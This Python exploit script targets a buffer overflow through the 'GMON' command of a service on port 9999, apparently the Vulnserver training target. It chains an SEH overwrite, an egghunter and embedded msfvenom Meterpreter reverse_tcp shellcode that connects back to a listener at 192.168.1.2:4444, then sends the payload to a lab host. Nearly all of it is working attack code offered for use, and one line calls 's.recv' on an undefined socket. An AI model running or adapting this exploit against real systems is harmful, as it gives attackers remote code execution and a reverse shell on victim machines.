""" 
	GMON /.:/ aaaaaaaaaaaaaaaaaa
"""

import os
import sys
import socket

host = "192.168.1.165"
port = 9999

nseh = "\xEB\xCE\x90\x90"   # Jump to 50 bytes egghubter  litle endian
seh = "\xB4\x10\x50\x62"    # !mona seh => POP POP RET  litle endian


# !mona egg -t CAPT  => Size: 32 bytes 
"""
	Command for mona  !mona egg -t CAPT

"""
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x43\x41\x50\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

#  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 EXITFUNC=thread -b "\x00" -f c

shellcode = ("\xbb\xba\xc7\x4f\x01\xdb\xde\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x5b\x31\x5e\x14\x03\x5e\x14\x83\xc6\x04\x58\x32\xb3\xe9\x1e"
"\xbd\x4c\xea\x7e\x37\xa9\xdb\xbe\x23\xb9\x4c\x0e\x27\xef\x60"
"\xe5\x65\x04\xf2\x8b\xa1\x2b\xb3\x21\x94\x02\x44\x19\xe4\x05"
"\xc6\x63\x39\xe6\xf7\xac\x4c\xe7\x30\xd0\xbd\xb5\xe9\x9f\x10"
"\x2a\x9d\xd5\xa8\xc1\xed\xf8\xa8\x36\xa5\xfb\x99\xe8\xbd\xa2"
"\x39\x0a\x11\xdf\x73\x14\x76\xe5\xca\xaf\x4c\x92\xcc\x79\x9d"
"\x5b\x62\x44\x11\xae\x7a\x80\x96\x50\x09\xf8\xe4\xed\x0a\x3f"
"\x96\x29\x9e\xa4\x30\xba\x38\x01\xc0\x6f\xde\xc2\xce\xc4\x94"
"\x8d\xd2\xdb\x79\xa6\xef\x50\x7c\x69\x66\x22\x5b\xad\x22\xf1"
"\xc2\xf4\x8e\x54\xfa\xe7\x70\x09\x5e\x63\x9c\x5e\xd3\x2e\xc9"
"\x93\xde\xd0\x09\xbb\x69\xa2\x3b\x64\xc2\x2c\x70\xed\xcc\xab"
"\x01\xf9\xee\x64\xa9\x69\x11\x85\xca\xa0\xd6\xd1\x9a\xda\xff"
"\x59\x71\x1a\xff\x8f\xec\x10\x97\xef\x59\x25\x65\x98\x9b\x25"
"\x78\x04\x15\xc3\x2a\xe4\x75\x5b\x8b\x54\x36\x0b\x63\xbf\xb9"
"\x74\x93\xc0\x13\x1d\x3e\x2f\xca\x76\xd7\xd6\x57\x0c\x46\x16"
"\x42\x69\x48\x9c\x67\x8e\x07\x55\x0d\x9c\x70\x02\xed\x5c\x81"
"\xa7\xed\x36\x85\x61\xb9\xae\x87\x54\x8d\x71\x77\xb3\x8d\x75"
"\x87\x42\xa4\x0e\xbe\xd0\x88\x78\xbf\x34\x09\x78\xe9\x5e\x09"
"\x10\x4d\x3b\x5a\x05\x92\x96\xce\x96\x07\x19\xa7\x4b\x8f\x71"
"\x45\xb2\xe7\xdd\xb6\x91\x7b\x19\x48\x64\x54\x82\x21\x96\xe4"
"\x32\xb2\xfc\xe4\x62\xda\x0b\xca\x8d\x2a\xf4\xc1\xc5\x22\x7f"
"\x84\xa4\xd3\x80\x8d\x69\x4a\x81\x22\xb2\x7d\xf8\x4b\x45\x7e"
"\xfd\x45\x22\x7e\xfe\x69\x54\x42\x29\x50\x22\x85\xea\xe7\x2d"
"\x18\xc6\x1d\xc6\x85\x83\x9f\x8b\x35\x7e\xe3\xb5\xb5\x8a\x9c"
"\x41\xa5\xff\x99\x0e\x61\xec\xd3\x1f\x04\x12\x47\x1f\x0d")

buffer = "CAPTCAPT" # !mona egg -t CAPT
buffer += shellcode
buffer += "A"*(3447-len(buffer))
buffer += egghunter
buffer += "A"*(3495-len(buffer))
buffer += nseh
buffer += seh
buffer += "D"*(5000-len(buffer))


# start sending exploit
try:
	print ("[+] connecting to target ..")
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((host,port))
	print s.recv(1024)
	print "[+] Sending Exploit........"
	sock.send("GMON /.:/" + buffer)
	print sock.recv(1024)
	sock.close()
except:
	print ("[+] Exploit Erorr ..")
	pass
